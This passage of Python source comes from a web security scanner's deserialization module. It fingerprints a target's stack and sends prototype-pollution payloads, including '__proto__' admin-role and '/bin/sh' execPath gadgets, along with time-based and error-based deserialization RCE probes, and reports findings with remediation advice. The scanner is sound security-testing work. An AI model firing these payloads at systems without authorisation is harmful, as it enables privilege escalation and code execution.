        # ====================================================================
        try:
            store = SharedFindingsStore.get_instance()
            for f in findings:
                await store.add_finding(
                    {
                        "type": f.type,
                        "endpoint": f.endpoint,
                        "severity": f.severity,
                        "metadata": f.metadata or {},
                    },
                    module="deserialization",
                )
        except Exception as e:
            logger.debug(f"[DESER] SharedFindingsStore error: {e}")

        return findings

    async def _detect_technology_stack(
        self,
        client: httpx.AsyncClient,
        base_url: str,
    ) -> str | None:
        """Detect the technology stack for targeted testing."""
        try:
            response = await client.get(base_url)
            headers = {k.lower(): v for k, v in response.headers.items()}
            body = response.text.lower()
            cookies = list(response.cookies.keys())

            # Node.js / Express
            if headers.get("x-powered-by", "").lower() == "express":
                return "node"
            if any(c in ["connect.sid", "express:sess"] for c in cookies):
                return "node"

            # Java
            if any(kw in body for kw in ["jsessionid", "java", "servlet", "spring", "tomcat"]):
                return "java"
            if "JSESSIONID" in cookies:
                return "java"
            if headers.get("server", "").lower() in ["tomcat", "jetty", "wildfly", "jboss"]:
                return "java"

            # PHP
            if "PHPSESSID" in cookies:
                return "php"
            if headers.get("x-powered-by", "").lower().startswith("php"):
                return "php"
            if any(kw in body for kw in ["laravel", "symfony", "wordpress", "drupal"]):
                return "php"

            # Python
            if any(kw in body for kw in ["django", "flask", "fastapi", "python"]):
                return "python"
            if headers.get("server", "").lower() in ["gunicorn", "uvicorn", "werkzeug"]:
                return "python"

            # .NET
            if "ASP.NET_SessionId" in cookies:
                return "dotnet"
            if "__VIEWSTATE" in response.text:
                return "dotnet"
            if headers.get("x-powered-by", "").lower().startswith("asp.net"):
                return "dotnet"
            if headers.get("x-aspnet-version"):
                return "dotnet"

            # Ruby
            if any(kw in body for kw in ["rails", "ruby", "sinatra"]):
                return "ruby"
            if "_session_id" in cookies:
                return "ruby"

            return None
        except Exception:
            return None

    async def _test_object_manipulation_impact(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test object manipulation with REAL IMPACT verification.

        Looks for:
        - Privilege escalation via object properties
        - Type confusion vulnerabilities
        - Mass assignment vulnerabilities
        """
        findings = []

        # Combine known endpoints with discovered ones
        test_endpoints = list(set(endpoints + [
            "/api/user", "/api/users", "/api/profile", "/api/account",
            "/api/settings", "/api/config", "/api/admin", "/api/auth",
            "/user", "/profile", "/account", "/settings", "/login",
            "/api/v1/user", "/api/v1/users", "/rest/user", "/rest/users",
        ]))

        for endpoint in test_endpoints[:20]:  # Limit to prevent excessive requests
            url = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"

            for payload in self.OBJECT_MANIPULATION_PAYLOADS["json_prototype_pollution"]:
                await rate_limiter.acquire()

                try:
                    # Test POST with object manipulation
                    response = await client.post(
                        url,
                        json=json.loads(payload),
                        headers={"Content-Type": "application/json"},
                    )

                    # Check for signs of successful manipulation
                    impact_indicators = [
                        ("isAdmin", "true", "Privilege Escalation"),
                        ("role", "admin", "Role Manipulation"),
                        ("authenticated", "true", "Authentication Bypass"),
                        ("polluted", "PHANTOM_TEST", "Prototype Pollution Confirmed"),
                    ]

                    response_text = response.text.lower()
                    response_body = response.text

                    for prop, value, impact_type in impact_indicators:
                        # Check if property was reflected or accepted
                        if prop.lower() in response_text and value.lower() in response_text:
                            findings.append(Finding(
                                name=f"Object Manipulation: {impact_type}",
                                severity=Severity.CRITICAL,
                                confidence_score=85.0,
                                description=(
                                    f"**CRITICAL IMPACT VERIFIED**\n\n"
                                    f"The endpoint `{endpoint}` is vulnerable to object manipulation.\n"
                                    f"The injected property `{prop}={value}` was processed by the server.\n\n"
                                    f"**Impact:** {impact_type}\n"
                                    f"**Attack Vector:** Attacker can modify object properties during deserialization\n"
                                    f"**CVSS:** 9.1 (Critical)"
                                ),
                                endpoint=url,
                                evidence=[
                                    f"Payload: {payload}",
                                    f"Property injected: {prop}={value}",
                                    f"Response (truncated): {response_body[:300]}",
                                ],
                                cwe_id="CWE-502",
                                cvss_score=9.1,
                                remediation=(
                                    "1. Use allowlist for accepted properties\n"
                                    "2. Freeze object prototypes: Object.freeze(Object.prototype)\n"
                                    "3. Validate and sanitize all deserialized data\n"
                                    "4. Use safe deserialization libraries"
                                ),
                            ))
                            break

                    # Check for server-side processing indicators
                    if response.status_code in [200, 201, 202]:
                        try:
                            resp_json = response.json()
                            # Check if any polluted property appears in response
                            if isinstance(resp_json, dict):
                                for key in ["isAdmin", "role", "polluted", "authenticated"]:
                                    if key in resp_json:
                                        findings.append(Finding(
                                            name="Object Property Injection Accepted",
                                            severity=Severity.HIGH,
                                            confidence_score=65.0,
                                            description=(
                                                f"The endpoint `{endpoint}` accepted injected properties.\n"
                                                f"Property `{key}` appeared in response, indicating the "
                                                f"object was deserialized and processed."
                                            ),
                                            endpoint=url,
                                            evidence=[f"Property: {key}", f"Response: {resp_json}"],
                                            cwe_id="CWE-502",
                                            cvss_score=7.5,
                                            remediation="Implement strict input validation and property allowlisting.",
                                        ))
                        except Exception:
                            pass

                except Exception as e:
                    logger.debug(f"Object manipulation test error: {e}")

        return findings

    async def _test_time_based_deserialization(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for deserialization vulnerabilities using TIME-BASED detection.

        This method measures response time differences to detect when
        serialized payloads are being processed, even without visible output.
        """
        findings = []

        # Determine which technology to test based on detection
        techs_to_test = ["node", "java", "php", "python", "dotnet", "ruby"]
        if self._detected_tech:
            # Prioritize detected technology
            techs_to_test = [self._detected_tech] + [t for t in techs_to_test if t != self._detected_tech]

        # Test endpoints for time-based vulnerabilities
        test_endpoints = list(set(endpoints + urls[:5]))

        for endpoint in test_endpoints[:10]:
            url = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"

            # First, establish baseline response time
            baseline_times = []
            for _ in range(3):
                await rate_limiter.acquire()
                try:
                    start = asyncio.get_event_loop().time()
                    await client.get(url, timeout=10.0)
                    baseline_times.append(asyncio.get_event_loop().time() - start)
                except Exception:
                    baseline_times.append(1.0)

            baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 1.0

            # Test each technology's time-based payloads
            for tech in techs_to_test[:3]:  # Limit to top 3 likely technologies
                if tech not in self.TIME_BASED_PAYLOADS:
                    continue

                for payload_name, payload, expected_delay in self.TIME_BASED_PAYLOADS[tech]:
                    await rate_limiter.acquire()

                    try:
                        # Test in different injection points
                        for injection_point in ["body", "cookie", "header", "param"]:
                            start_time = asyncio.get_event_loop().time()

                            if injection_point == "body":
                                response = await client.post(
                                    url,
                                    content=payload if isinstance(payload, str) else payload.encode(),
                                    headers={"Content-Type": "application/octet-stream"},
                                    timeout=expected_delay + 5,
                                )
                            elif injection_point == "cookie":
                                response = await client.get(
                                    url,
                                    cookies={"session": payload, "data": payload},
                                    timeout=expected_delay + 5,
                                )
                            elif injection_point == "header":
                                response = await client.get(
                                    url,
                                    headers={"X-Serialized-Data": payload},
                                    timeout=expected_delay + 5,
                                )
                            else:  # param
                                response = await client.get(
                                    f"{url}?data={quote(payload)}",
                                    timeout=expected_delay + 5,
                                )

                            elapsed = asyncio.get_event_loop().time() - start_time

                            # Check if delay was triggered (significant difference from baseline)
                            if elapsed > baseline + (expected_delay * 0.7):
                                # ============ VERIFICATION: Retry + Negative Control ============
                                # GAP-D2 FIX 2026-02-18: Enhanced retry with median comparison
                                # Problem: 2 retries + average is too sensitive to network jitter
                                # Solution: 4 retries + median for robust timing verification

                                # Step 1: Retry the payload 4 times to confirm consistency
                                retry_times = []
                                for _ in range(4):  # GAP-D2: Increased from 2 to 4
                                    await rate_limiter.acquire()
                                    try:
                                        retry_start = asyncio.get_event_loop().time()
                                        if injection_point == "body":
                                            await client.post(
                                                url,
                                                content=payload if isinstance(payload, str) else payload.encode(),
                                                headers={"Content-Type": "application/octet-stream"},
                                                timeout=expected_delay + 5,
                                            )
                                        elif injection_point == "param":
                                            await client.get(f"{url}?data={quote(payload)}", timeout=expected_delay + 5)
                                        else:
                                            await client.get(url, timeout=expected_delay + 5)
                                        retry_times.append(asyncio.get_event_loop().time() - retry_start)
                                    except asyncio.TimeoutError:
                                        retry_times.append(expected_delay + 5)
                                    except Exception:
                                        # On error, treat as fast response (not delayed)
                                        retry_times.append(baseline * 0.5)

                                # GAP-D2 FIX: Use MEDIAN instead of average (robust to outliers)
                                def median(values: list[float]) -> float:
                                    if not values:
                                        return 0.0
                                    sorted_vals = sorted(values)
                                    n = len(sorted_vals)
                                    if n % 2 == 1:
                                        return sorted_vals[n // 2]
                                    else:
                                        return (sorted_vals[n // 2 - 1] + sorted_vals[n // 2]) / 2

                                retry_median = median(retry_times)
                                retry_avg = sum(retry_times) / len(retry_times) if retry_times else 0

                                # GAP-D2 FIX: Consistent if MEDIAN > baseline + half expected delay
                                # AND at least 3 of 4 retries show delay
                                delayed_count = sum(1 for t in retry_times if t > baseline + (expected_delay * 0.5))
                                consistent_delay = (
                                    retry_median > baseline + (expected_delay * 0.5) and
                                    delayed_count >= 3  # At least 3 of 4 retries delayed
                                )
                                logger.debug(
                                    f"[DESER] Retry stats: median={retry_median:.2f}s, "
                                    f"avg={retry_avg:.2f}s, delayed={delayed_count}/4"
                                )

                                # Step 2: Negative control - send benign payload, should NOT delay
                                negative_control_passed = True
                                if tech in self.CANARY_PAYLOADS and self.CANARY_PAYLOADS[tech]:
                                    canary_name, canary_payload = self.CANARY_PAYLOADS[tech][0][:2]
                                    await rate_limiter.acquire()
                                    try:
                                        canary_start = asyncio.get_event_loop().time()
                                        if injection_point == "body":
                                            await client.post(
                                                url,
                                                content=canary_payload if isinstance(canary_payload, str) else canary_payload.encode(),
                                                headers={"Content-Type": "application/octet-stream"},
                                                timeout=10.0,
                                            )
                                        else:
                                            await client.get(f"{url}?data={quote(canary_payload)}", timeout=10.0)
                                        canary_elapsed = asyncio.get_event_loop().time() - canary_start

                                        # Canary should complete quickly (within baseline + 1s tolerance)
                                        negative_control_passed = canary_elapsed < baseline + 1.0
                                    except Exception:
                                        negative_control_passed = True  # Error is OK for canary

                                # Calculate final confidence based on verification results
                                if consistent_delay and negative_control_passed:
                                    final_confidence = 95.0
                                    severity = "CRITICAL"
                                elif consistent_delay or negative_control_passed:
                                    final_confidence = 80.0
                                    severity = "CRITICAL"
                                else:
                                    final_confidence = 60.0
                                    severity = "HIGH"
                                    logger.debug(f"Time-based finding at {url} downgraded (verification failed)")

                                findings.append(Finding(
                                    name=f"Time-Based Deserialization: {tech.upper()} RCE",
                                    severity=severity,
                                    confidence_score=final_confidence,
                                    description=(
                                        f"**{severity}: Remote Code Execution via Deserialization**\n\n"
                                        f"Time-based detection confirmed insecure deserialization at `{endpoint}`.\n\n"
                                        f"**Technology:** {tech.upper()}\n"
                                        f"**Payload:** {payload_name}\n"
                                        f"**Injection Point:** {injection_point}\n"
                                        f"**Baseline Response:** {baseline:.2f}s\n"
                                        f"**Payload Response:** {elapsed:.2f}s (initial), {retry_avg:.2f}s (retry avg)\n"
                                        f"**Expected Delay:** {expected_delay}s\n"
                                        f"**Verification:** Retry consistent={consistent_delay}, Negative control={negative_control_passed}\n\n"
                                        f"The server took significantly longer to respond when processing "
                                        f"the serialized payload, confirming that untrusted data is being deserialized."
                                    ),
                                    endpoint=url,
                                    evidence=[
                                        f"Baseline: {baseline:.2f}s",
                                        f"Initial payload: {elapsed:.2f}s",
                                        f"Retry avg: {retry_avg:.2f}s",
                                        f"Delta: {elapsed - baseline:.2f}s",
                                        f"Payload type: {payload_name}",
                                        f"Retry consistent: {consistent_delay}",
                                        f"Negative control passed: {negative_control_passed}",
                                    ],
                                    cwe_id="CWE-502",
                                    cvss_score=9.8 if severity == "CRITICAL" else 8.5,
                                    remediation=(
                                        f"1. Never deserialize untrusted {tech} data\n"
                                        f"2. Use safe serialization formats (JSON with schema validation)\n"
                                        f"3. Implement integrity checks on serialized data\n"
                                        f"4. Run deserialization in sandboxed environment"
                                    ),
                                    metadata={
                                        "verification": {
                                            "retry_consistent": consistent_delay,
                                            "negative_control_passed": negative_control_passed,
                                            "retry_times": retry_times,
                                        }
                                    }
                                ))
                                logger.warning(f"{severity}: Time-based deserialization RCE at {url}")

                    except asyncio.TimeoutError:
                        # Timeout itself can indicate successful delay injection
                        findings.append(Finding(
                            name=f"Potential Time-Based Deserialization: {tech.upper()}",
                            severity=Severity.HIGH,
                            confidence_score=65.0,
                            description=(
                                f"Request timed out when processing {tech} serialization payload.\n"
                                f"This may indicate successful delay injection via deserialization."
                            ),
                            endpoint=url,
                            evidence=[f"Timeout with payload: {payload_name}"],
                            cwe_id="CWE-502",
                            cvss_score=8.5,
                            remediation="Investigate deserialization of untrusted data.",
                        ))
                    except Exception as e:
                        logger.debug(f"Time-based test error: {e}")

        return findings

    async def _test_error_based_deserialization(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for deserialization vulnerabilities using ERROR-BASED detection.

        Sends invalid serialized data that triggers distinctive error messages
        when the application attempts to deserialize it.

        FP MITIGATION v3.0:
        - Skip static assets and SPA trivial endpoints
        - Skip training applications (WebGoat, DVWA, etc.)
        - Validates HTTP status code (skip 404/500 error pages)
        - Checks content-type (skip HTML/SPA responses)
        - MANDATORY negative control (compare with safe payload)
        - Requires deserialization-SPECIFIC error patterns
        - Multiple signal requirements for CRITICAL severity
        """
        findings = []

        # Determine which technology to test
        techs_to_test = ["node", "java", "php", "python", "dotnet"]
        if self._detected_tech:
            techs_to_test = [self._detected_tech] + [t for t in techs_to_test if t != self._detected_tech]

        test_endpoints = list(set(endpoints + urls[:5]))

        for endpoint in test_endpoints[:15]:
            url = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"

            # FP MITIGATION v3.0: Skip static assets
            if self._is_static_asset(url):
                logger.debug(f"[DESER] Skipping static asset: {url}")
                continue

            # FP MITIGATION v3.0: Skip SPA trivial endpoints
            if self._is_spa_trivial_endpoint(url):
                logger.debug(f"[DESER] Skipping SPA/trivial endpoint: {url}")
                continue

            # FP MITIGATION v3.0: Get baseline response for negative control
            baseline_text, baseline_hash = await self._get_baseline_response(client, url, rate_limiter)

            for tech in techs_to_test[:3]:
                if tech not in self.ERROR_BASED_PAYLOADS:
                    continue

                # Check if tech matches fingerprint
                tech_matches_fingerprint = (
                    self._detected_tech is None or
                    self._detected_tech == tech
                )

                for payload_name, payload, error_indicators in self.ERROR_BASED_PAYLOADS[tech]:
                    await rate_limiter.acquire()

                    try:
                        # Test in body
                        response = await client.post(
                            url,
                            content=payload.encode() if isinstance(payload, str) else payload,
                            headers={"Content-Type": "application/octet-stream"},
                        )

                        response_text = response.text
                        content_type = response.headers.get("content-type", "")
                        headers_dict = dict(response.headers)

                        # FP MITIGATION v3.0: Skip error pages (404, 500, etc.)
                        if self._is_error_page(response.status_code, response_text, content_type):
                            logger.debug(f"[DESER] Skipping error page at {url}")
                            continue

                        # Check for error indicators
                        for indicator in error_indicators:
                            if indicator.lower() in response_text.lower():
                                # FP MITIGATION v3.0: Check if this is a generic error
                                if self._is_generic_error(indicator, response_text):
                                    logger.debug(f"[DESER] Generic error '{indicator}' at {url}")
                                    is_specific, specific_match = self._is_deser_specific_error(tech, response_text)
                                    if not is_specific:
                                        logger.debug(f"[DESER] No specific pattern, skipping")
                                        continue

                                # FP MITIGATION v3.0: Baseline comparison
                                baseline_matches = indicator.lower() in baseline_text.lower()
                                if baseline_matches:
                                    logger.debug(f"[DESER] Baseline has '{indicator}', likely FP")
                                    continue

                                # FP MITIGATION v3.0: MANDATORY negative control
                                neg_control_failed = await self._negative_control_check(
                                    client, url, payload, indicator, rate_limiter
                                )
                                if neg_control_failed:
                                    logger.debug(f"[DESER] Negative control FAILED at {url}")
                                    continue

                                # FP MITIGATION v3.0: Check for specific error patterns
                                is_specific, specific_match = self._is_deser_specific_error(tech, response_text)

                                # Calculate confidence with all signals
                                confidence = self._calculate_confidence(
                                    is_specific=is_specific,
                                    status_code=response.status_code,
                                    baseline_matches=baseline_matches,
                                    negative_control_failed=neg_control_failed,
                                    tech_fingerprint_matches=tech_matches_fingerprint,
                                )

                                # Calculate severity based on confidence
                                has_rce_indicator = any(
                                    rce in response_text.lower()
                                    for rce in ["exec", "shell", "command", "rce", "system"]
                                )
                                severity = self._calculate_severity_from_signals(
                                    confidence,
                                    has_rce_indicator,
                                )

                                findings.append(Finding(
                                    name=f"Error-Based Deserialization: {tech.upper()} Detected",
                                    severity=severity,
                                    confidence_score=confidence,
                                    description=(
                                        f"Error-based detection found that `{endpoint}` may deserialize "
                                        f"untrusted {tech.upper()} data.\n\n"
                                        f"**Technology:** {tech.upper()}\n"
                                        f"**Error Pattern:** `{indicator}`\n"
                                        f"**Specific Match:** `{specific_match or 'None'}`\n"
                                        f"**Payload:** {payload_name}\n"
                                        f"**Negative Control:** PASSED\n"
                                        f"**Tech Fingerprint Match:** {tech_matches_fingerprint}"
                                    ),
                                    endpoint=url,
                                    evidence=[
                                        f"Error indicator: {indicator}",
                                        f"Specific pattern: {specific_match or 'Generic'}",
                                        f"Status code: {response.status_code}",
                                        f"Negative control: PASSED",
                                        f"Response (truncated): {response_text[:300]}",
                                    ],
                                    cwe_id="CWE-502",
                                    cvss_score=9.0 if severity == "CRITICAL" else 7.5 if severity == "HIGH" else 5.0,
                                    remediation=(
                                        f"1. Do not deserialize untrusted {tech} data\n"
                                        f"2. Use JSON or other safe formats\n"
                                        f"3. Implement allowlist for allowed classes\n"
                                        f"4. Add integrity verification to serialized data"
                                    ),
                                ))
                                logger.warning(f"[DESER] Error-based detection at {url} (severity: {severity}, confidence: {confidence})")
                                break

                        # Also test in cookies and parameters (with same validation)
                        for param_name in ["session", "data", "token", "state", "object"]:
                            await rate_limiter.acquire()

                            # Cookie test
                            response = await client.get(url, cookies={param_name: payload})
                            resp_text = response.text
                            resp_ct = response.headers.get("content-type", "")

                            # FP MITIGATION v3.0: Apply same validation
                            if self._is_error_page(response.status_code, resp_text, resp_ct):
                                continue

                            if any(ind.lower() in resp_text.lower() for ind in error_indicators):
                                # Baseline check
                                if any(ind.lower() in baseline_text.lower() for ind in error_indicators):
                                    continue

                                # Negative control for cookies
                                neg_failed = await self._negative_control_check(
                                    client, url, "test_safe_value", error_indicators[0], rate_limiter
                                )
                                if neg_failed:
                                    continue

                                is_specific, specific_match = self._is_deser_specific_error(tech, resp_text)
                                confidence = self._calculate_confidence(
                                    is_specific, response.status_code, False,
                                    neg_failed, tech_matches_fingerprint
                                )
                                severity = self._calculate_severity_from_signals(
                                    confidence, False
                                )

                                if severity == "INFO":
                                    continue

                                findings.append(Finding(
                                    name=f"Cookie Deserialization: {tech.upper()}",
                                    severity=severity,
                                    confidence_score=confidence,
                                    description=(
                                        f"Cookie `{param_name}` may be deserialized using {tech.upper()}.\n"
                                        f"This could allow attackers to inject malicious objects via cookies."
                                    ),
                                    endpoint=url,
                                    evidence=[
                                        f"Cookie: {param_name}",
                                        f"Technology: {tech}",
                                        f"Pattern: {specific_match or 'Generic'}",
                                        f"Negative control: PASSED",
                                    ],
                                    cwe_id="CWE-502",
                                    cvss_score=9.5 if severity == "CRITICAL" else 8.0 if severity == "HIGH" else 5.0,
                                    remediation="Never deserialize untrusted cookie data.",
                                ))
                                break

                    except Exception as e:
                        logger.debug(f"Error-based test error: {e}")

        return findings

    async def _test_prototype_pollution_impact(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for Prototype Pollution with IMPACT verification.

        Specifically tests Node.js/JavaScript applications for prototype pollution
        vulnerabilities that can lead to RCE, authentication bypass, or DoS.
        """
        findings = []

        # Only run if Node.js is detected or unknown
        if self._detected_tech and self._detected_tech not in ["node", None]:
            return findings

        # Pollution payloads with different impacts
        pollution_payloads = [
            # Admin privilege escalation
            ('{"__proto__":{"isAdmin":true}}', "isAdmin", "Privilege Escalation"),
            ('{"__proto__":{"admin":true}}', "admin", "Privilege Escalation"),
            ('{"__proto__":{"role":"admin"}}', "role", "Role Manipulation"),
            ('{"constructor":{"prototype":{"isAdmin":true}}}', "isAdmin", "Constructor Pollution"),

            # Authentication bypass
            ('{"__proto__":{"authenticated":true}}', "authenticated", "Auth Bypass"),
            ('{"__proto__":{"user":"admin"}}', "user", "User Impersonation"),

            # RCE gadgets
            ('{"__proto__":{"shell":"node"}}', "shell", "Potential RCE"),
            ('{"__proto__":{"execPath":"/bin/sh"}}', "execPath", "Potential RCE"),

            # DoS
            ('{"__proto__":{"toString":"PHANTOM"}}', "toString", "DoS via Function Override"),
        ]

        test_endpoints = list(set(endpoints + [
            "/api/user", "/api/login", "/api/profile", "/api/settings",
            "/api/merge", "/api/update", "/api/config",
        ]))

        for endpoint in test_endpoints[:15]:
            url = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"

            for payload, check_prop, impact_type in pollution_payloads:
                await rate_limiter.acquire()

                try:
                    # Test POST with JSON
                    response = await client.post(
                        url,
                        content=payload,
                        headers={"Content-Type": "application/json"},
                    )

                    # Verify impact by checking response
                    if response.status_code in [200, 201, 202]:
                        try:
                            resp_data = response.json()
                            if isinstance(resp_data, dict):
                                # Check if polluted property appears in response
                                if check_prop in resp_data or check_prop in str(resp_data):
                                    findings.append(Finding(
                                        name=f"Prototype Pollution: {impact_type}",
                                        severity=Severity.CRITICAL,
                                        confidence_score=85.0,
                                        description=(
                                            f"**CRITICAL: Prototype Pollution with {impact_type}**\n\n"
                                            f"The endpoint `{endpoint}` is vulnerable to prototype pollution.\n"
                                            f"Polluted property `{check_prop}` was reflected in response.\n\n"
                                            f"**Impact:** {impact_type}\n"
                                            f"**Attack Vector:** JSON merge/assignment without sanitization\n"
                                            f"**CVSS:** 9.0 (Critical)"
                                        ),
                                        endpoint=url,
                                        evidence=[
                                            f"Payload: {payload}",
                                            f"Polluted property: {check_prop}",
                                        ],
                                        cwe_id="CWE-1321",
                                        cvss_score=9.0,
                                        remediation=(
                                            "1. Use Object.freeze(Object.prototype)\n"
                                            "2. Validate __proto__ and constructor in input\n"
                                            "3. Use Map instead of plain objects\n"
                                            "4. Use safe merge libraries (lodash >=4.17.12)"
                                        ),
                                    ))
                                    logger.warning(f"Prototype pollution: {impact_type} at {url}")
                        except Exception:
                            pass

                    # Check for error messages indicating processing
                    error_indicators = [
                        "prototype", "__proto__", "constructor",
                        "Object.prototype", "cannot read property",
                    ]
                    for indicator in error_indicators:
                        if indicator in response.text.lower():
                            findings.append(Finding(
                                name="Prototype Pollution Attempt Detected",
                                severity=Severity.HIGH,
                                confidence_score=65.0,
                                description=(
                                    f"The server processed prototype pollution payload.\n"
                                    f"Error message indicates object manipulation attempt was parsed."
                                ),
                                endpoint=url,
                                evidence=[f"Indicator: {indicator}"],
                                cwe_id="CWE-1321",
                                cvss_score=7.5,
                                remediation="Implement prototype pollution protection.",
                            ))
                            break

                except Exception as e:
                    logger.debug(f"Prototype pollution test error: {e}")

        return findings

    async def _detect_framework(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Detect the underlying framework for targeted testing."""
        findings = []

        await rate_limiter.acquire()

        try:
            response = await client.get(base_url)
            headers = dict(response.headers)
            cookies = list(response.cookies.keys())
            body = response.text.lower()

            for sig_name, signature in self.FRAMEWORK_SIGNATURES.items():
                matched = False
                evidence = []

                # Check headers
                for header_name in signature.headers:
                    if header_name.lower() in [h.lower() for h in headers]:
                        matched = True
                        evidence.append(f"Header: {header_name}")

                # Check cookies
                for cookie in signature.cookies:
                    if cookie.lower() in [c.lower() for c in cookies]:
                        matched = True
                        evidence.append(f"Cookie: {cookie}")

                # Check body patterns
                for pattern in signature.body_patterns:
                    if pattern.lower() in body:
                        matched = True
                        evidence.append(f"Body pattern: {pattern}")

                if matched:
                    self.detected_framework = signature

                    # Report framework with known gadget chains
                    if signature.gadget_chains:
                        chains = [gc.value for gc in signature.gadget_chains[:3]]
                        findings.append(Finding(
                            name=f"{signature.name} Framework Detected",
                            severity=Severity.INFO,
                            confidence_score=85.0,
                            description=f"{signature.name} detected. Known deserialization gadgets available.",
                            endpoint=base_url,
                            evidence=evidence + [f"Potential gadgets: {', '.join(chains)}"],
                            cwe_id="CWE-502",
                            remediation=f"Ensure {signature.name} is patched and deserialization is secure.",
                        ))

                    # Check for known CVEs
                    if signature.cves:
                        findings.append(Finding(
                            name=f"{signature.name} Potential CVE Exposure",
                            severity=Severity.HIGH,
                            confidence_score=40.0,
                            description=f"{signature.name} has known deserialization CVEs",
                            endpoint=base_url,
                            evidence=[f"Known CVEs: {', '.join(signature.cves[:5])}"],
                            cwe_id="CWE-502",
                            remediation=f"Verify {signature.name} version and apply security patches.",
                        ))

                    break  # Use first matched framework

        except Exception as e:
            logger.debug(f"Error detecting framework: {e}")

        return findings

    async def _detect_serialization(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Detect serialization usage in application."""
        findings = []

        for url in urls[:20]:
            await rate_limiter.acquire()

            try:
                response = await client.get(url)

                # Check for Java serialized data
                if self.JAVA_MAGIC_B64 in response.text:
                    findings.append(Finding(
                        name="Java Serialized Data Detected",
                        severity=Severity.HIGH,
                        confidence_score=85.0,
                        description="Application uses Java serialization which may be vulnerable",
                        endpoint=url,
                        evidence=["Java serialized object pattern (rO0AB) found in response"],
                        cwe_id="CWE-502",
                        cvss_score=8.1,
                        remediation="Replace Java serialization with safe alternatives like JSON. "
                                   "If serialization is required, implement look-ahead validation.",
                    ))

                # Check for PHP serialized data
                if self.PHP_SERIALIZE_PATTERN.search(response.text):
                    findings.append(Finding(
                        name="PHP Serialized Data Detected",
                        severity=Severity.HIGH,
                        confidence_score=65.0,
                        description="Application appears to use PHP serialization",
                        endpoint=url,
                        evidence=["PHP serialization pattern (O:N:, a:N:, etc.) found"],
                        cwe_id="CWE-502",
                        cvss_score=8.1,
                        remediation="Use json_encode/json_decode instead of serialize/unserialize.",
                    ))

                # Check for Python pickle markers
                pickle_b64_indicators = ["gASV", "gAJV", "gANV", "gARV", "gAUV"]  # Protocol markers
                for indicator in pickle_b64_indicators:
                    if indicator in response.text:
                        findings.append(Finding(
                            name="Python Pickle Data Detected",
                            severity=Severity.HIGH,
                            confidence_score=65.0,
                            description="Application appears to use Python pickle serialization",
                            endpoint=url,
                            evidence=[f"Pickle base64 pattern ({indicator}) found"],
                            cwe_id="CWE-502",
                            cvss_score=8.1,
                            remediation="Never use pickle.loads() on untrusted data. Use JSON instead.",
                        ))
                        break

                # Check for Ruby Marshal
                marshal_b64 = "BAg"  # \x04\x08 in base64
                if marshal_b64 in response.text:
                    findings.append(Finding(
                        name="Ruby Marshal Data Detected",
                        severity=Severity.HIGH,
                        confidence_score=40.0,
                        description="Application may use Ruby Marshal serialization",
                        endpoint=url,
                        evidence=["Ruby Marshal magic bytes pattern found"],
                        cwe_id="CWE-502",
                        cvss_score=8.1,
                        remediation="Use JSON instead of Marshal.load on untrusted data.",
                    ))

                # Check cookies for serialized data
                for cookie_name, cookie_value in response.cookies.items():
                    # Try base64 decode and check
                    try:
                        decoded = base64.b64decode(cookie_value)

                        if decoded.startswith(self.JAVA_MAGIC):
                            findings.append(Finding(
                                name="Java Serialized Cookie",
                                severity=Severity.CRITICAL,
                                confidence_score=85.0,
                                description=f"Cookie '{cookie_name}' contains Java serialized object",
                                endpoint=url,
                                evidence=[
                                    f"Cookie: {cookie_name}",
                                    "Java magic bytes (0xACED) detected",
                                ],
                                cwe_id="CWE-502",
                                cvss_score=9.8,
                                remediation="Never store serialized objects in cookies. Use secure session management.",
                            ))

                        if decoded.startswith(self.RUBY_MARSHAL_MAGIC):
                            findings.append(Finding(
                                name="Ruby Marshal Cookie",
                                severity=Severity.CRITICAL,
                                confidence_score=85.0,
                                description=f"Cookie '{cookie_name}' contains Ruby Marshal data",
                                endpoint=url,
                                evidence=[f"Cookie: {cookie_name}"],
                                cwe_id="CWE-502",
                                cvss_score=9.8,
                                remediation="Use secure session storage instead of Marshal cookies.",
                            ))

                    except Exception:
                        pass

                    # Check for PHP serialization in cookie (not base64)
                    if self.PHP_SERIALIZE_PATTERN.search(cookie_value):
                        findings.append(Finding(
                            name="PHP Serialized Cookie",
                            severity=Severity.CRITICAL,
                            confidence_score=85.0,
                            description=f"Cookie '{cookie_name}' contains PHP serialized data",
                            endpoint=url,
                            evidence=[f"Cookie: {cookie_name}"],
                            cwe_id="CWE-502",
                            cvss_score=9.8,
                            remediation="Never use unserialize() on user-controlled cookies.",
                        ))

                    # Check for node-serialize marker
                    if "_$$ND_FUNC$$_" in cookie_value:
                        findings.append(Finding(
                            name="Node.js node-serialize Cookie",
                            severity=Severity.CRITICAL,
                            confidence_score=85.0,
                            description=f"Cookie '{cookie_name}' contains node-serialize data",
                            endpoint=url,
                            evidence=[f"Cookie: {cookie_name}", "IIFE marker detected"],
                            cwe_id="CWE-502",
                            cvss_score=9.8,
                            remediation="Remove node-serialize. Use JSON.parse/stringify instead.",
                        ))

            except Exception as e:
                logger.debug(f"Error detecting serialization: {e}")

        return findings

    async def _test_known_cves(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for specific known CVEs based on detected framework."""
        findings = []

        if not self.detected_framework:
            return findings

        framework = self.detected_framework

        # Test framework-specific CVEs
        if "weblogic" in framework.name.lower():
            # CVE-2017-10271 - XMLDecoder
